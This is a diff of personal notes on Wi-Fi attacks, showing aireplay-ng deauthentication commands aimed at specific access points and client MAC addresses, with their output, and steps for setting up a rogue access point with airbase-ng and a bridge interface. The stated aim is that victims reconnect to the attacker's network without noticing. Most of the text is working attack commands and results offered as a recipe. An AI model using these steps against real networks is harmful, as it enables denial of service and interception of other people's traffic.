@@ -2,7 +2,7 @@
 
 ... the attack we are demonstrating here is de auth attack
 ... which is the disconnecting the client from the ap so
-... that the client connects back with the ap again and 
+... that the client connects back with the ap again and
 ... complete the 4way handshake again.
 
 aireplay-ng --help
@@ -24,20 +24,20 @@ aireplay-ng --help
 eoperation with --ignore-negative-one or apply a kernel patch
 Please specify a BSSID (-a).
 
- # aireplay-ng --deauth 1 -a C4:E9:84:84:25:5E --ignore-negative-one wlan0mon 
+ # aireplay-ng --deauth 1 -a C4:E9:84:84:25:5E --ignore-negative-one wlan0mon
 16:26:36  Waiting for beacon frame (BSSID: C4:E9:84:84:25:5E) on channel -1
 NB: this attack is more effective when targeting
 a connected wireless client (-c <client's mac>).
 16:26:38  Sending DeAuth to broadcast -- BSSID: [C4:E9:84:84:25:5E]
 
- # aireplay-ng --deauth 1 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon 
+ # aireplay-ng --deauth 1 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon
 16:28:08  Waiting for beacon frame (BSSID: C4:E9:84:EB:B4:60) on channel -1
 16:28:09  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 1|37 ACKs]
 
 ... when we need to disconnect all the connected clients we weill use the -0 options
 ... with the deauth options like below.
 
-aireplay-ng --deauth 0 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon 
+aireplay-ng --deauth 0 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon
 16:38:12  Waiting for beacon frame (BSSID: C4:E9:84:EB:B4:60) on channel -1
 16:38:12  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 0|58 ACKs]
 16:38:13  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 0|46 ACKs]
@@ -70,10 +70,10 @@ airbase-ng --help
 Error: Got channel -1, expected a value > 0.
 
  # airodump-ng wlan0mon
-  
+
  BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 
- AA:AA:BB:BB:CC:CC    0      263        0    0  11  54   OPN              Rokeya 
+ AA:AA:BB:BB:CC:CC    0      263        0    0  11  54   OPN              Rokeya
 
 ... after creating the rougue access-point we can deauth all the associated
 ... client to disconnect and connect back to our accesspoint.
@@ -84,7 +84,7 @@ Error: Got channel -1, expected a value > 0.
 ... interface. attacker provide his internet access so that victim never
 ... notice that he is using any unsolicited network.
 
-1. create any rougue ap using any suitable name using airbase-ng command 
+1. create any rougue ap using any suitable name using airbase-ng command
 2. create one bridge-interface and add interface to it.
 
  # brctl addbr masum-wifi-bridge
@@ -101,5 +101,4 @@ Error: Got channel -1, expected a value > 0.
  # echo 1 > /proc/sys/net/ipv4/ip_forward
 
 ... if there is a dhcp server running in the lan or in laptop can get the ip
-... 
-
+...
